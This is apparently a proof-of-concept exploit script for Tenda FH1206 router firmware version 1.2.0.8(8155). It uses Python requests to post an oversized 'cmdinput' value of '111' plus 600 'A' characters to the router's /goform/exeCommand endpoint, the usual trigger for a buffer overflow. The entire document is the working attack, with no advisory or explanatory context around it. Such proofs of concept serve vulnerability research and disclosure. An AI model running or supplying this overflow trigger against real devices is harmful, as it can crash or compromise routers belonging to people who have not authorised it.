# Tenda FH1206 1.2.0.8(8155)

import requests

ip = '192.168.153.100:80'

url = f"http://{ip}/goform/exeCommand"

data = {'cmdinput': '111'+'A'*600}

ret = requests.post(url, data)
